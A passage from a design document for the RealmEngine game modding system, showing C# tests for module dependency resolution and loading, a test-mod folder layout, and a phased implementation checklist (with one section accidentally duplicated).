        var resolver = new ModuleDependencyResolver();
        
        // Act
        var sorted = resolver.ResolveDependencies(modules.ToList());
        
        // Assert
        sorted.Select(m => m.Id).Should().BeInOrder();
        sorted[0].Id.Should().Be("mod-a");
        sorted[1].Id.Should().Be("mod-b");
        sorted[2].Id.Should().Be("mod-c");
    }
}
```

### Integration Tests

```csharp
public class ModuleIntegrationTests
{
    [Fact]
    public async Task LoadModule_AddsItemsToDatabase()
    {
        // Arrange
        var services = BuildServiceProvider();
        var loader = services.GetRequiredService<ModuleLoaderService>();
        var itemService = services.GetRequiredService<ItemDataService>();
        var initialCount = itemService.GetAllItems().Count();
        
        // Act
        var module = await loader.LoadModuleAsync("test-items-mod");
        
        // Assert
        module.Success.Should().BeTrue();
        var newCount = itemService.GetAllItems().Count();
        newCount.Should().BeGreaterThan(initialCount);
    }
}
```

### Test Mods

```
RealmEngine.Modding.Tests/
└── TestMods/
    ├── ValidModule/
    │   ├── module.json         ← Valid manifest
    │   └── Data/Json/items/catalog.json
    ├── InvalidModule/
    │   └── module.json         ← Missing required fields
    └── CircularDependency/
        ├── ModA/
        │   └── module.json     ← Depends on ModB
        └── ModB/
            └── module.json     ← Depends on ModA
```

---

## Related Systems

- [Item System](inventory-system.md) - Moddable items
- [Quest System](quest-system.md) - Moddable quests  
- [Combat System](combat-system.md) - Moddable enemies, abilities
- [Crafting System](crafting-system.md) - Moddable recipes
- [Spell System](spells-system.md) - Moddable spells

---

## Implementation Checklist

### Phase 1: Content Modules (Weeks 1-2)

**Week 1: Project Setup & Models**
- [ ] Create `RealmEngine.Modding` project
- [ ] Add project references (Shared, Data, Core)
- [ ] Define `ModuleManifest.cs` model
- [ ] Define `ModuleInfo.cs` model
- [ ] Define `ModuleLoadResult.cs` model
- [ ] Define `ModuleLoadMode.cs` enum
- [ ] Write manifest JSON schema
- [ ] Unit tests for models

### Phase 1: Content Modules (Weeks 1-2)

**Week 1: Project Setup & Models**
- [ ] Create `RealmEngine.Modding` project
- [ ] Add project references (Shared, Data, Core)
- [ ] Define `ModuleManifest.cs` model
- [ ] Define `ModuleInfo.cs` model
- [ ] Define `ModuleLoadResult.cs` model
- [ ] Define `ModuleLoadMode.cs` enum
- [ ] Write manifest JSON schema
- [ ] Unit tests for models

**Week 2: Core Services & RealmForge Integration**
- [ ] Implement `ModuleLoaderService` (discovery)
- [ ] Implement `ModuleValidator` (schema validation)
- [ ] Implement `ModuleDependencyResolver` (sorting)
- [ ] Implement content providers:
  - [ ] `ItemContentProvider`
  - [ ] `EnemyContentProvider`
  - [ ] `QuestContentProvider`
  - [ ] `SpellContentProvider`
  - [ ] `AbilityContentProvider`
  - [ ] `RecipeContentProvider`
  - [ ] `NpcContentProvider`
  - [ ] `ClassContentProvider`
  - [ ] `SkillContentProvider`
  - [ ] `AchievementContentProvider`
  - [ ] `StatusEffectContentProvider`
  - [ ] `DifficultyContentProvider`
  - [ ] `LocationContentProvider`
  - [ ] `FactionContentProvider`
  - [ ] `DialogueContentProvider`
  - [ ] `EnchantmentContentProvider`
- [ ] Implement `ModuleMergeService` (additive merging)
- [ ] Integration tests with test mods
- [ ] Godot integration example
- [ ] **RealmForge mod support:**
  - [ ] New Mod Project wizard
  - [ ] Open Mod Project command
  - [ ] Mod Manifest Editor (GUI form)
  - [ ] "Switch Mode" (Base Game / Mod) in UI
  - [ ] Mod Packager (.zip export)
  - [ ] Test in Game button
  - [ ] Mod validation UI
- [ ] Documentation updates

### Phase 2: Override Support (Week 3)
- [ ] Add override mode to manifest
- [ ] Implement `ModuleConflictResolver`
- [ ] Add conflict detection
- [ ] Add user warnings for overrides
- [ ] Priority system for load order
- [ ] Unit tests for override behavior
- [ ] UI for conflict resolution

### Phase 3: C# Scripting (Month 2+)
- [ ] Design `IModScript` API surface
- [ ] Implement `ScriptCompiler` (Roslyn)
- [ ] Implement namespace banning
- [ ] Implement `ScriptSandbox` (AssemblyLoadContext)
- [ ] Event hook system
- [ ] Security audit
- [ ] Example script mods
- [ ] Script mod documentation
- [ ] Performance testing

---

**Last Updated**: January 12, 2026 23:00 UTC  
**Status**: Design Complete, Ready for Implementation
